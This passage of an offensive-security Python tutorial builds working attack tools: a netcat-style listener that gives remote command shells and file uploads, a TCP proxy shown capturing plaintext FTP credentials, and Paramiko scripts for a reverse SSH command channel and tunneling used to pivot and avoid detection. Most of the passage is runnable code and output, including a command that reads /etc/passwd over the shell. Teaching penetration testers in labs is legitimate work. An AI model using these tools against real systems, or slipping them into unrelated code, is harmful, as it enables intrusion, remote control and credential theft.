self.buffer:\nself.socket.send(self.buffer)\n2\ntry:\n3\nwhile True:\nrecv_len = 1\nresponse = ''\nwhile recv_len:\ndata = self.socket.recv(4096)\nrecv_len = len(data)\nresponse += data.decode()\nif recv_len < 4096:\n4\nbreak\nif response:\nprint(response)\nbuffer = input('> ')\nbuffer += '\\n'\n5\nself.socket.send(buffer.encode())\n6\nexcept KeyboardInterrupt:\nprint('User terminated.')\nself.socket.close()\nsys.exit()\nWe connect to the target and port 1, and if we have a buffer, we\nsend that to the target first. Then we set up a block so we\ntry/catch\ncan manually close the connection with CTRL-C 2. Next, we start a\nloop 3 to receive data from the target. If there is no more data, we\nbreak out of the loop 4. Otherwise, we print the response data and\npause to get interactive input, send that input 5, and continue the\nloop.\nThe loop will continue until the occurs (CTRL-\nKeyboardInterrupt\nC) 6, which will close the socket.\nNow let’s write the method that executes when the program runs\nas a listener:\ndef listen(self):\n1\nself.socket.bind((self.args.target, self.args.port))\nself.socket.listen(5)\n2\nwhile True:\nclient_socket, _ = self.socket.accept()\n3\nclient_thread = threading.Thread(\ntarget=self.handle, args=(client_socket,)\n)\nclient_thread.start()\nThe method binds to the target and port 1 and starts\nlisten\nlistening in a loop 2, passing the connected socket to the\nhandle\nmethod 3.\nNow let’s implement the logic to perform file uploads, execute\ncommands, and create an interactive shell. The program can\nperform these tasks when operating as a listener.\ndef handle(self, client_socket):\n1\nif self.args.execute:\noutput = execute(self.args.execute)\nclient_socket.send(output.encode())\n2\nelif self.args.upload:\nfile_buffer = b''\nwhile True:\ndata = client_socket.recv(4096)\nif data:\nfile_buffer += data\nelse:\nbreak\nwith open(self.args.upload, 'wb') as f:\nf.write(file_buffer)\nmessage = f'Saved file {self.args.upload}'\nclient_socket.send(message.encode())\n3\nelif self.args.command:\ncmd_buffer = b''\nwhile True:\ntry:\nclient_socket.send(b'BHP: #> ')\nwhile '\\n' not in cmd_buffer.decode():\ncmd_buffer += client_socket.recv(64)\nresponse = execute(cmd_buffer.decode())\nif response:\nclient_socket.send(response.encode())\ncmd_buffer = b''\nexcept Exception as e:\nprint(f'server killed {e}')\nself.socket.close()\nsys.exit()\nThe method executes the task corresponding to the\nhandle\ncommand line argument it receives: execute a command, upload a\nfile, or start a shell. If a command should be executed 1, the\nhandle\nmethod passes that command to the function and sends the\nexecute\noutput back on the socket. If a file should be uploaded 2, we set up a\nloop to listen for content on the listening socket and receive data\nuntil there’s no more data coming in. Then we write that accumulated\ncontent to the specified file. Finally, if a shell is to be created 3, we\nset up a loop, send a prompt to the sender, and wait for a command\nstring to come back. We then execute the command by using the\nfunction and return the output of the command to the sender.\nexecute\nYou’ll notice that the shell scans for a newline character to\ndetermine when to process a command, which makes it netcat\nfriendly. That is, you can use this program on the listener side and\nuse netcat itself on the sender side. However, if you’re conjuring up a\nPython client to speak to it, remember to add the newline character.\nIn the method, you can see we do add the newline character\nsend\nafter we get input from the console.\nKicking the Tires\nNow let’s play around with it a bit to see some output. In one terminal\nor shell, run the script with the - argument:\ncmd.exe -help\n$ python netcat.py --help\nusage: netcat.py [-h] [-c] [-e EXECUTE] [-l] [-p PORT] [-t\nTARGET] [-u UPLOAD]\nBHP Net Tool\noptional arguments:\n-h, --help show this help message and exit\n-c, --command initialize command shell\n-e EXECUTE, --execute EXECUTE\nexecute specified command\n-l, --listen listen\n-p PORT, --port PORT specified port\n-t TARGET, --target TARGET\nspecified IP\n-u UPLOAD, --upload UPLOAD\nupload file\nExample:\nnetcat.py -t 192.168.1.108 -p 5555 -l -c # command\nshell\nnetcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt #\nupload to file\nnetcat.py -t 192.168.1.108 -p 5555 -l -e=\"cat\n/etc/passwd\" # execute command\necho 'ABCDEFGHI' | ./netcat.py -t 192.168.1.108 -p 135\n# echo local text to server port 135\nnetcat.py -t 192.168.1.108 -p 5555 # connect to server\nNow, on your Kali machine, set up a listener using its own IP and\nport 5555 to provide a command shell:\n$ python netcat.py -t 192.168.1.203 -p 5555 -l -c\nNow fire up another terminal on your local machine and run the\nscript in client mode. Remember that the script reads from stdin and\nwill do so until it receives the end-of-file (EOF) marker. To send EOF,\npress CTRL-D on your keyboard:\n% python netcat.py -t 192.168.1.203 -p 5555\nCTRL-D\n<BHP:#> ls -la\ntotal 23497\ndrwxr-xr-x 1 502 dialout 608 May 16 17:12 .\ndrwxr-xr-x 1 502 dialout 512 Mar 29 11:23 ..\n-rw-r--r-- 1 502 dialout 8795 May 6 10:10 mytest.png\n-rw-r--r-- 1 502 dialout 14610 May 11 09:06 mytest.sh\n-rw-r--r-- 1 502 dialout 8795 May 6 10:10 mytest.txt\n-rw-r--r-- 1 502 dialout 4408 May 11 08:55 netcat.py\n<BHP: #> uname -a\nLinux kali 5.3.0-kali3-amd64 #1 SMP Debian 5.3.15-1kali1\n(2019-12-09) x86_64 GNU/Linux\nYou can see that we receive our custom command shell. Because\nwe’re on a Unix host, we can run local commands and receive output\nin return, as if we had logged in via SSH or were on the box locally.\nWe can perform the same setup on the Kali machine but have it\nexecute a single command using the switch:\n-e\n$ python netcat.py -t 192.168.1.203 -p 5555 -l -e=\"cat\n/etc/passwd\"\nNow, when we connect to Kali from the local machine, we’re\nrewarded with the output from the command:\n% python netcat.py -t 192.168.1.203 -p 5555\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nWe could also use netcat on the local machine:\n% nc 192.168.1.203 5555\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nFinally, we could use the client to send out requests the good, old-\nfashioned way:\n$ echo -ne \"GET / HTTP/1.1\\r\\nHost: reachtim.com\\r\\n\\r\\n\"\n|python ./netcat.py -t reachtim.com -p 80\nHTTP/1.1 301 Moved Permanently\nServer: nginx\nDate: Mon, 18 May 2020 12:46:30 GMT\nContent-Type: text/html; charset=iso-8859-1\nContent-Length: 229\nConnection: keep-alive\nLocation: https://reachtim.com/\n<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n<html><head>\n<title>301 Moved Permanently</title>\n</head><body>\n<h1>Moved Permanently</h1>\n<p>The document has moved <a\nhref=\"https://reachtim.com/\">here</a>.</p>\n</body></html>\nThere you go! While not a super technical technique, it’s a good\nfoundation for hacking together some client and server sockets in\nPython and using them for evil. Of course, this program covers only\nthe fundamentals; use your imagination to expand or improve it.\nNext, let’s build a TCP proxy, which is useful in any number of\noffensive scenarios.\nBuilding a TCP Proxy\nThere are several reasons to have a TCP proxy in your tool belt. You\nmight use one for forwarding traffic to bounce from host to host, or\nwhen assessing network-based software. When performing\npenetration tests in enterprise environments, you probably won’t be\nable to run Wireshark; nor will you be able to load drivers to sniff the\nloopback on Windows, and network segmentation will prevent you\nfrom running your tools directly against your target host. We’ve built\nsimple Python proxies, like this one, in various cases to help you\nunderstand unknown protocols, modify traffic being sent to an\napplication, and create test cases for fuzzers.\nThe proxy has a few moving parts. Let’s summarize the four main\nfunctions we need to write. We need to display the communication\nbetween the local and remote machines to the console ( ). We\nhexdump\nneed to receive data from an incoming socket from either the local or\nremote machine ( ). We need to manage the traffic\nreceive_from\ndirection between remote and local machines ( ).\nproxy_handler\nFinally, we need to set up a listening socket and pass it to our\n( ).\nproxy_handler server_loop\nLet’s get to it. Open a new file called proxy.py:\nimport sys\nimport socket\nimport threading\n1\nHEX_FILTER = ''.join(\n[(len(repr(chr(i))) == 3) and chr(i) or '.' for i in\nrange(256)])\ndef hexdump(src, length=16, show=True):\n2\nif isinstance(src, bytes):\nsrc = src.decode()\nresults = list()\nfor i in range(0, len(src), length):\n3\nword = str(src[i:i+length])\n4\nprintable = word.translate(HEX_FILTER)\nhexa = ' '.join([f'{ord(c):02X}' for c in word])\nhexwidth = length*3\n5\nresults.append(f'{i:04x} {hexa:<{hexwidth}}\n{printable}')\nif show:\nfor line in results:\nprint(line)\nelse:\nreturn results\nWe start with a few imports. Then we define a function\nhexdump\nthat takes some input as bytes or a string and prints a hexdump to\nthe console. That is, it will output the packet details with both their\nhexadecimal values and ASCII-printable characters. This is useful\nfor understanding unknown protocols, finding user credentials in\nplaintext protocols, and much more. We create a string 1\nHEXFILTER\nthat contains ASCII printable characters, if one exists, or a dot (.) if\nsuch a representation doesn’t exist. For an example of what this\nstring could contain, let’s look at the character representations of two\nintegers, 30 and 65, in an interactive Python shell:\n>>> chr(65)\n'A'\n>>> chr(30)\n'\\x1e'\n>>> len(repr(chr(65)))\n3\n>>> len(repr(chr(30)))\n6\nThe character representation of 65 is printable and the character\nrepresentation of 30 is not. As you can see, the representation of the\nprintable character has a length of 3. We use that fact to create the\nfinal string: provide the character if possible and a dot (.) if\nHEXFILTER\nnot.\nThe list comprehension used to create the string employs a\nBoolean short-circuit technique, which sounds pretty fancy. Let’s\nbreak it down: for each integer in the range of 0 to 255, if the length\nof the corresponding character equals 3, we get the character\n( ). Otherwise, we get a dot ( ). Then we that list into a\nchr(i) . join\nstring so it looks something like this:\n'................................\n!\"#$%&\\'()*+,-./0123456789:;<=>?\n@ABCDEFGHIJKLMNOPQRSTUVWXYZ[.]^_`abcdefghijklmnopqrstuvwxyz{|\n}~..................................¡¢£¤¥¦§¨©ª«¬.®¯°±²³\n´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïð\nñòóôõö÷øùúûüýþÿ'\nThe list comprehension gives a printable character representation\nof the first 256 integers. Now we can create the function.\nhexdump\nFirst, we make sure we have a string, decoding the bytes if a byte\nstring was passed in 2. Then we grab a piece of the string to dump\nand put it into the variable 3. We use the built-in\nword translate\nfunction to substitute the string representation of each character for\nthe corresponding character in the raw string ( ) 4.\nprintable\nLikewise, we substitute the hex representation of the integer value of\nevery character in the raw string ( ). Finally, we create a new\nhexa\narray to hold the strings, , that contains the hex value of the\nresult\nindex of the first byte in the word, the hex value of the word, and its\nprintable representation 5. The output looks like this:\n>> hexdump('python rocks\\n and proxies roll\\n')\n0000 70 79 74 68 6F 6E 20 72 6F 63 6B 73 0A 20 61 6E\npython rocks. an\n0010 64 20 70 72 6F 78 69 65 73 20 72 6F 6C 6C 0A d\nproxies roll.\nThis function provides us with a way to watch the communication\ngoing through the proxy in real time. Now let’s create a function that\nthe two ends of the proxy will use to receive data:\ndef receive_from(connection):\nbuffer = b\"\"\n1\nconnection.settimeout(5)\ntry:\nwhile True:\n2\ndata = connection.recv(4096)\nif not data:\nbreak\nbuffer += data\nexcept Exception as e:\npass\nreturn buffer\nFor receiving both local and remote data, we pass in the socket\nobject to be used. We create an empty byte string, , that will\nbuffer\naccumulate responses from the socket 1. By default, we set a five-\nsecond time-out, which might be aggressive if you’re proxying traffic\nto other countries or over lossy networks, so increase the time-out as\nnecessary. We set up a loop to read response data into the 2\nbuffer\nuntil there’s no more data or we time out. Finally, we return the\nbyte string to the caller, which could be either the local or\nbuffer\nremote machine.\nSometimes you may want to modify the response or request\npackets before the proxy sends them on their way. Let’s add a\ncouple of functions ( and ) to do\nrequest_handler response_handler\njust that:\ndef request_handler(buffer):\n# perform packet modifications\nreturn buffer\ndef response_handler(buffer):\n# perform packet modifications\nreturn buffer\nInside these functions, you can modify the packet contents,\nperform fuzzing tasks, test for authentication issues, or do whatever\nelse your heart desires. This can be useful, for example, if you find\nplaintext user credentials being sent and want to try to elevate\nprivileges on an application by passing in instead of your own\nadmin\nusername.\nLet’s dive into the function now by adding this code:\nproxy_handler\ndef proxy_handler(client_socket, remote_host, remote_port,\nreceive_first):\nremote_socket = socket.socket(socket.AF_INET,\nsocket.SOCK_STREAM)\n1\nremote_socket.connect((remote_host, remote_port))\n2\nif receive_first:\nremote_buffer = receive_from(remote_socket)\nhexdump(remote_buffer)\n3\nremote_buffer = response_handler(remote_buffer)\nif len(remote_buffer):\nprint(\"[<==] Sending %d bytes to localhost.\" %\nlen(remote_buffer))\nclient_socket.send(remote_buffer)\nwhile True:\nlocal_buffer = receive_from(client_socket)\nif len(local_buffer):\nline = \"[==>]Received %d bytes from localhost.\" %\nlen(local_buffer)\nprint(line)\nhexdump(local_buffer)\nlocal_buffer = request_handler(local_buffer)\nremote_socket.send(local_buffer)\nprint(\"[==>] Sent to remote.\")\nremote_buffer = receive_from(remote_socket)\nif len(remote_buffer):\nprint(\"[<==] Received %d bytes from remote.\" %\nlen(remote_buffer))\nhexdump(remote_buffer)\nremote_buffer = response_handler(remote_buffer)\nclient_socket.send(remote_buffer)\nprint(\"[<==] Sent to localhost.\")\n4\nif not len(local_buffer) or not len(remote_buffer):\nclient_socket.close()\nremote_socket.close()\nprint(\"[*] No more data. Closing connections.\")\nbreak\nThis function contains the bulk of the logic for our proxy. To start\noff, we connect to the remote host 1. Then we check to make sure\nwe don’t need to first initiate a connection to the remote side and\nrequest data before going into the main loop 2. Some server\ndaemons will expect you to do this (FTP servers typically send a\nbanner first, for example). We then use the function for\nreceive_from\nboth sides of the communication. It accepts a connected socket\nobject and performs a receive. We dump the contents of the packet\nso that we can inspect it for anything interesting. Next, we hand the\noutput to the function 3 and then send the received\nresponse_handler\nbuffer to the local client. The rest of the proxy code is\nstraightforward: we set up our loop to continually read from the local\nclient, process the data, send it to the remote client, read from the\nremote client, process the data, and send it to the local client until we\nno longer detect any data. When there’s no data to send on either\nside of the connection 4, we close both the local and remote sockets\nand break out of the loop.\nLet’s put together the function to set up and manage\nserver_loop\nthe connection:\ndef server_loop(local_host, local_port,\nremote_host, remote_port, receive_first):\nserver = socket.socket(socket.AF_INET,\n1\nsocket.SOCK_STREAM)\ntry:\n2\nserver.bind((local_host, local_port))\nexcept Exception as e:\nprint('problem on bind: %r' % e)\nprint(\"[!!] Failed to listen on %s:%d\" % (local_host,\nlocal_port))\nprint(\"[!!] Check for other listening sockets or\ncorrect permissions.\")\nsys.exit(0)\nprint(\"[*] Listening on %s:%d\" % (local_host,\nlocal_port))\nserver.listen(5)\n3\nwhile True:\nclient_socket, addr = server.accept()\n# print out the local connection information\nline = \"> Received incoming connection from %s:%d\" %\n(addr[0], addr[1])\nprint(line)\n# start a thread to talk to the remote host\n4\nproxy_thread = threading.Thread(\ntarget=proxy_handler,\nargs=(client_socket, remote_host,\nremote_port, receive_first))\nproxy_thread.start()\nThe function creates a socket 1 and then binds to the\nserver_loop\nlocal host and listens 2. In the main loop 3, when a fresh connection\nrequest comes in, we hand it off to the in a new thread\nproxy_handler\n4, which does all of the sending and receiving of juicy bits to either\nside of the data stream.\nThe only part left to write is the function:\nmain\ndef main():\nif len(sys.argv[1:]) != 5:\nprint(\"Usage: ./proxy.py [localhost] [localport]\",\nend='')\nprint(\"[remotehost] [remoteport] [receive_first]\")\nprint(\"Example: ./proxy.py 127.0.0.1 9000 10.12.132.1\n9000 True\")\nsys.exit(0)\nlocal_host = sys.argv[1]\nlocal_port = int(sys.argv[2])\nremote_host = sys.argv[3]\nremote_port = int(sys.argv[4])\nreceive_first = sys.argv[5]\nif \"True\" in receive_first:\nreceive_first = True\nelse:\nreceive_first = False\nserver_loop(local_host, local_port,\nremote_host, remote_port, receive_first)\nif __name__ == '__main__':\nmain()\nIn the function, we take in some command line arguments\nmain\nand then fire up the server loop that listens for connections.\nKicking the Tires\nNow that we have the core proxy loop and the supporting functions\nin place, let’s test it against an FTP server. Fire up the proxy with the\nfollowing options:\ntim@kali: sudo python proxy.py 192.168.1.203 21\nftp.sun.ac.za 21 True\nWe used here because port 21 is a privileged port, so\nsudo\nlistening on it requires administrative or root privileges. Now launch\nany FTP client and set it to use localhost and port 21 as its remote\nhost and port. Of course, you’ll want to point your proxy to an FTP\nserver that will actually respond to you. When we ran this against a\ntest FTP server, we got the following result:\n[*] Listening on 192.168.1.203:21\n> Received incoming connection from 192.168.1.203:47360\n[<==] Received 30 bytes from remote.\n0000 32 32 30 20 57 65 6C 63 6F 6D 65 20 74 6F 20 66 220\nWelcome to f\n0010 74 70 2E 73 75 6E 2E 61 63 2E 7A 61 0D 0A\ntp.sun.ac.za..\n0000 55 53 45 52 20 61 6E 6F 6E 79 6D 6F 75 73 0D 0A USER\nanonymous..\n0000 33 33 31 20 50 6C 65 61 73 65 20 73 70 65 63 69 331\nPlease speci\n0010 66 79 20 74 68 65 20 70 61 73 73 77 6F 72 64 2E fy\nthe password.\n0020 0D 0A ..\n0000 50 41 53 53 20 73 65 6B 72 65 74 0D 0A PASS\nsekret..\n0000 32 33 30 20 4C 6F 67 69 6E 20 73 75 63 63 65 73 230\nLogin succes\n0010 73 66 75 6C 2E 0D 0A\nsful...\n[==>] Sent to local.\n[<==] Received 6 bytes from local.\n0000 53 59 53 54 0D 0A\nSYST..\n0000 32 31 35 20 55 4E 49 58 20 54 79 70 65 3A 20 4C 215\nUNIX Type: L\n0010 38 0D 0A 8..\n[<==] Received 28 bytes from local.\n0000 50 4F 52 54 20 31 39 32 2C 31 36 38 2C 31 2C 32 PORT\n192,168,1,2\n0010 30 33 2C 31 38 37 2C 32 32 33 0D 0A\n03,187,223..\n0000 32 30 30 20 50 4F 52 54 20 63 6F 6D 6D 61 6E 64 200\nPORT command\n0010 20 73 75 63 63 65 73 73 66 75 6C 2E 20 43 6F 6E\nsuccessful. Con\n0020 73 69 64 65 72 20 75 73 69 6E 67 20 50 41 53 56 sider\nusing PASV\n0030 2E 0D 0A ...\n[<==] Received 6 bytes from local.\n0000 4C 49 53 54 0D 0A\nLIST..\n[<==] Received 63 bytes from remote.\n0000 31 35 30 20 48 65 72 65 20 63 6F 6D 65 73 20 74 150\nHere comes t\n0010 68 65 20 64 69 72 65 63 74 6F 72 79 20 6C 69 73 he\ndirectory lis\n0020 74 69 6E 67 2E 0D 0A 32 32 36 20 44 69 72 65 63\nting...226 Direc\n0030 74 6F 72 79 20 73 65 6E 64 20 4F 4B 2E 0D 0A tory\nsend OK...\n0000 50 4F 52 54 20 31 39 32 2C 31 36 38 2C 31 2C 32 PORT\n192,168,1,2\n0010 30 33 2C 32 31 38 2C 31 31 0D 0A\n03,218,11..\n0000 32 30 30 20 50 4F 52 54 20 63 6F 6D 6D 61 6E 64 200\nPORT command\n0010 20 73 75 63 63 65 73 73 66 75 6C 2E 20 43 6F 6E\nsuccessful. Con\n0020 73 69 64 65 72 20 75 73 69 6E 67 20 50 41 53 56 sider\nusing PASV\n0030 2E 0D 0A ...\n0000 51 55 49 54 0D 0A\nQUIT..\n[==>] Sent to remote.\n0000 32 32 31 20 47 6F 6F 64 62 79 65 2E 0D 0A 221\nGoodbye...\n[==>] Sent to local.\n[*] No more data. Closing connections.\nIn another terminal on the Kali machine, we started an FTP\nsession to the Kali machine's IP address using the default port, 21:\ntim@kali:$ ftp 192.168.1.203\nConnected to 192.168.1.203.\n220 Welcome to ftp.sun.ac.za\nName (192.168.1.203:tim): anonymous\n331 Please specify the password.\nPassword:\n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\nlrwxrwxrwx 1 1001 1001 48 Jul 17 2008 CPAN\n-> pub/mirrors/ftp.funet.fi/pub/languages/perl/CPAN\nlrwxrwxrwx 1 1001 1001 21 Oct 21 2009 CRAN\n-> pub/mirrors/ubuntu.com\ndrwxr-xr-x 2 1001 1001 4096 Apr 03 2019 veeam\ndrwxr-xr-x 6 1001 1001 4096 Jun 27 2016\nwin32InetKeyTeraTerm\n226 Directory send OK.\nftp> bye\n221 Goodbye.\nYou can clearly see that we’re able to successfully receive the FTP\nbanner and send in a username and password, and that it cleanly\nexits.\nSSH with Paramiko\nPivoting with BHNET, the netcat replacement we built, is pretty\nhandy, but sometimes it’s wise to encrypt your traffic to avoid\ndetection. A common means of doing so is to tunnel the traffic using\nSecure Shell (SSH). But what if your target doesn’t have an SSH\nclient, just like 99.81943 percent of Windows systems?\nWhile there are great SSH clients available for Windows, like\nPuTTY, this is a book about Python. In Python, you could use raw\nsockets and some crypto magic to create your own SSH client or\nserver—but why create when you can reuse? Paramiko, which uses\nPyCrypto, gives you simple access to the SSH2 protocol.\nTo learn about how this library works, we’ll use Paramiko to make\na connection and run a command on an SSH system, configure an\nSSH server and SSH client to run remote commands on a Windows\nmachine, and finally puzzle out the reverse tunnel demo file included\nwith Paramiko to duplicate the proxy option of BHNET. Let’s begin.\nFirst, grab Paramiko by using the installer (or download it from\npip\nhttp://www.paramiko.org/):\npip install paramiko\nWe’ll use some of the demo files later, so make sure you\ndownload them from the Paramiko GitHub repo as well\n(https://github.com/paramiko/paramiko/).\nCreate a new file called ssh_cmd.py and enter the following:\nimport paramiko\n1\ndef ssh_command(ip, port, user, passwd, cmd):\nclient = paramiko.SSHClient()\n2\nclient.set_missing_host_key_policy(paramiko.AutoAddPolicy())\nclient.connect(ip, port=port, username=user,\npassword=passwd)\n3\n_, stdout, stderr = client.exec_command(cmd)\noutput = stdout.readlines() + stderr.readlines()\nif output:\nprint('--- Output ---')\nfor line in output:\nprint(line.strip())\nif __name__ == '__main__':\n4\nimport getpass\n# user = getpass.getuser()\nuser = input('Username: ')\npassword = getpass.getpass()\nip = input('Enter server IP: ') or '192.168.1.203'\nport = input('Enter port or <CR>: ') or 2222\ncmd = input('Enter command or <CR>: ') or 'id'\n5\nssh_command(ip, port, user, password, cmd)\nWe create a function called 1, which makes a\nssh_command\nconnection to an SSH server and runs a single command. Note that\nParamiko supports authentication with keys instead of (or in addition\nto) password authentication. You should use SSH key authentication\nin a real engagement, but for ease of use in this example, we’ll stick\nwith the traditional username and password authentication.\nBecause we’re controlling both ends of this connection, we set the\npolicy to accept the SSH key for the SSH server we’re connecting to\n2 and make the connection. Assuming the connection is made, we\nrun the command 3 that we passed in the call to the\nssh_command\nfunction. Then, if the command produced output, we print each line\nof the output.\nIn the main block, we use a new module, 4. You can use it\ngetpass\nto get the username from the current environment, but since our\nusername is different on the two machines, we explicitly ask for the\nusername on the command line. We then use the function to\ngetpass\nrequest the password (the response will not be displayed on the\nconsole to frustrate any shoulder-surfers). Then we get the IP, port,\nand command ( ) to run and send it to be executed 5.\ncmd\nLet’s run a quick test by connecting to our Linux server:\n% python ssh_cmd.py\nUsername: tim\nPassword:\nEnter server IP: 192.168.1.203\nEnter port or <CR>: 22\nEnter command or <CR>: id\n--- Output ---\nuid=1000(tim) gid=1000(tim) groups=1000(tim),27(sudo)\nYou’ll see that we connect and then run the command. You can\neasily modify this script to run multiple commands on an SSH server,\nor run commands on multiple SSH servers.\nWith the basics done, let’s modify the script so it can run\ncommands on the Windows client over SSH. Of course, when using\nSSH, you’d normally use an SSH client to connect to an SSH server,\nbut because most versions of Windows don’t include an SSH server\nout of the box, we need to reverse this and send commands from an\nSSH server to the SSH client.\nCreate a new file called ssh_rcmd.py and enter the following:\nimport paramiko\nimport shlex\nimport subprocess\ndef ssh_command(ip, port, user, passwd, command):\nclient = paramiko.SSHClient()\nclient.set_missing_host_key_policy(paramiko.AutoAddPolicy())\nclient.connect(ip, port=port, username=user,\npassword=passwd)\nssh_session = client.get_transport().open_session()\nif ssh_session.active:\nssh_session.send(command)\nprint(ssh_session.recv(1024).decode())\nwhile True:\n1\ncommand = ssh_session.recv(1024)\ntry:\ncmd = command.decode()\nif cmd == 'exit':\nclient.close()\nbreak\ncmd_output =\n2\nsubprocess.check_output(shlex.split(cmd), shell=True)\n3\nssh_session.send(cmd_output or 'okay')\nexcept Exception as e:\nssh_session.send(str(e))\nclient.close()\nreturn\nif __name__ == '__main__':\nimport getpass\nuser = getpass.getuser()\npassword = getpass.getpass()\nip = input('Enter server IP: ')\nport = input('Enter port: ')\nssh_command(ip, port, user, password, 'ClientConnected')\n4\nThe program begins as last one did, and the new stuff starts in the\nloop. In this loop, instead of executing a single\nwhile True:\ncommand, as we did in the previous example, we take commands\nfrom the connection 1, execute the command 2, and send any output\nback to the caller 3.\nAlso, notice that the first command we send is 4.\nClientConnected\nYou’ll see why when we create the other end of the SSH connection.\nNow let’s write a program that creates an SSH server for our SSH\nclient (where we’ll run commands) to connect to. This could be a\nLinux, Windows, or even macOS system that has Python and\nParamiko installed. Create a new file called ssh_server.py and enter\nthe following:\nimport os\nimport paramiko\nimport socket\nimport sys\nimport threading\nCWD = os.path.dirname(os.path.realpath(__file__))\n1\nHOSTKEY = paramiko.RSAKey(filename=os.path.join(CWD,\n'test_rsa.key'))\n2\nclass Server (paramiko.ServerInterface):\ndef _init_(self):\nself.event = threading.Event()\ndef check_channel_request(self, kind, chanid):\nif kind == 'session':\nreturn paramiko.OPEN_SUCCEEDED\nreturn\nparamiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED\ndef check_auth_password(self, username, password):\nif (username == 'tim') and (password == 'sekret'):\nreturn paramiko.AUTH_SUCCESSFUL\nif __name__ == '__main__':\nserver = '192.168.1.207'\nssh_port = 2222\ntry:\nsock = socket.socket(socket.AF_INET,\nsocket.SOCK_STREAM)\nsock.setsockopt(socket.SOL_SOCKET,\nsocket.SO_REUSEADDR, 1)\n3\nsock.bind((server, ssh_port))\nsock.listen(100)\nprint('[+] Listening for connection ...')\nclient, addr = sock.accept()\nexcept Exception as e:\nprint('[-] Listen failed: ' + str(e))\nsys.exit(1)\nelse:\nprint('[+] Got a connection!', client, addr)\n4\nbhSession = paramiko.Transport(client)\nbhSession.add_server_key(HOSTKEY)\nserver = Server()\nbhSession.start_server(server=server)\nchan = bhSession.accept(20)\nif chan is None:\nprint('*** No channel.')\nsys.exit(1)\n5\nprint('[+] Authenticated!')\n6\nprint(chan.recv(1024))\nchan.send('Welcome to bh_ssh')\ntry:\nwhile True:\ncommand= input(\"Enter command: \")\nif command != 'exit':\nchan.send(command)\nr = chan.recv(8192)\nprint(r.decode())\nelse:\nchan.send('exit')\nprint('exiting')\nbhSession.close()\nbreak\nexcept KeyboardInterrupt:\nbhSession.close()\nFor this example, we’re using the SSH key included in the\nParamiko demo files 1. We start a socket listener 3, just as we did\nearlier in the chapter, and then “SSH-inize” it 2 and configure the\nauthentication methods 4. When a client has authenticated 5 and\nsent us the message 6, any command we type into\nClientConnected\nthe SSH server (the machine running ssh_server.py) is sent to the\nSSH client (the machine running ssh_rcmd.py) and executed on the\nSSH client, which returns the output to SSH server. Let’s give it a go.\nKicking the Tires\nFor the demo, we'll run the client on our (the authors’) Windows\nmachine and the server on a Mac. Here we start up the server:\n% python ssh_server.py\n[+] Listening for connection ...\nNow, on the Windows machine, we start the client:\nC:\\Users\\tim>: $ python ssh_rcmd.py\nPassword:\nWelcome to bh_ssh\nAnd back on the server, we see the connection:\n[+] Got a connection! from ('192.168.1.208', 61852)\n[+] Authenticated!\nClientConnected\nEnter command: whoami\ndesktop-cc91n7i\\tim\nEnter command: ipconfig\nWindows IP Configuration\n<snip>\nYou can see that the client is successfully connected, at which\npoint we run some commands. We don’t see anything in the SSH\nclient, but the command we sent is executed on the client, and the\noutput is sent to our SSH server.\nSSH Tunneling\nIn the last section, we built a tool that allowed us to run commands\nby entering them into an SSH client on a remote SSH server.\nAnother technique would be to use an SSH tunnel. Instead of\nsending commands to the server, an SSH tunnel would send\nnetwork traffic packaged inside of SSH, and the SSH server would\nunpackage and deliver it.\nImagine that you’re in the following situation: You have remote\naccess to an SSH server on an internal network, but you want\naccess to the web server on the same network. You can’t access the\nweb server directly. The server with SSH installed does have access,\nbut this SSH server doesn’t have the tools you want to use.\nOne way to overcome this problem is to set up a forward SSH\ntunnel. This would allow you to, for example, run the command\nssh -\nto connect to the SSH server as the\nL 8008:web:80 justin@sshserver\nuser justin and set up port 8008 on your local system. Anything you\nsend to port 8008 will travel down the existing SSH tunnel to the\nSSH server, which would deliver it to the web server. Figure 2-1\nshows this in action.\nFigure 2-1: SSH forward tunneling\nThat’s pretty cool, but recall that not many Windows systems are\nrunning an SSH server service. Not all is lost, though. We can\nconfigure a reverse SSH tunneling connection. In this case, we\nconnect to our own SSH server from the Windows client in the usual\nfashion. Through that SSH connection, we also specify a remote port\non the SSH server that gets tunneled to the local host and port, as\nshown in Figure 2-2. We could use this local host and port, for\nexample, to expose port 3389 to access an internal system using\nRemote Desktop or to access another system that the Windows\nclient can access (like the web server in our example).\nFigure 2-2: SSH reverse tunneling\nThe Paramiko demo files include a file called rforward.py that does\nexactly this. It works perfectly as is, so we won’t reprint that file in\nthis book. We will, however, point out a couple of important points\nand run through an example of how to use it. Open rforward.py, skip\nto , and follow along:\nmain()\ndef main():\n1\noptions, server, remote = parse_options()\npassword = None\nif options.readpass:\npassword = getpass.getpass('Enter SSH password: ')\n2\nclient = paramiko.SSHClient()\nclient.load_system_host_keys()\nclient.set_missing_host_key_policy(paramiko.WarningPolicy())\nverbose('Connecting to ssh host %s:%d ...' % (server[0],\nserver[1]))\ntry:\nclient.connect(server[0],\nserver[1],\nusername=options.user,\nkey_filename=options.keyfile,\nlook_for_keys=options.look_for_keys,\npassword=password\n)\nexcept Exception as e:\nprint('*** Failed to connect to %s:%d: %r' %\n(server[0], server[1], e))\nsys.exit(1)\nverbose(\n'Now forwarding remote port %d to %s:%d ...'\n% (options.port, remote[0], remote[1])\n)\ntry:\n3\nreverse_forward_tunnel(\noptions.port, remote[0], remote[1],\nclient.get_transport()\n)\nexcept KeyboardInterrupt:\nprint('C-c: Port forwarding 